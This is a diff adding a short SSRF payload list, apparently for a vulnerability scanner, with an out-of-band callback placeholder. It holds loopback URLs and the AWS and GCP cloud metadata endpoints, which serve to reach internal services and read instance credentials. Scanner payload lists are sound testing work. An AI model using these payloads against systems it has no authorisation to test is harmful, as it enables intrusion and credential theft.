@@ -1,0 +1,8 @@
+# SSRF payloads. {{OOB}} is replaced at inject time with the live OOB
+# callback URL (http://<listener>/<token>) — see vuln/ssrf.py templating.
+{{OOB}}
+http://127.0.0.1:8080/ssrf
+http://localhost:8080/ssrf
+http://[::1]:8080/ssrf
+http://169.254.169.254/latest/meta-data/
+http://metadata.google.internal/computeMetadata/v1/
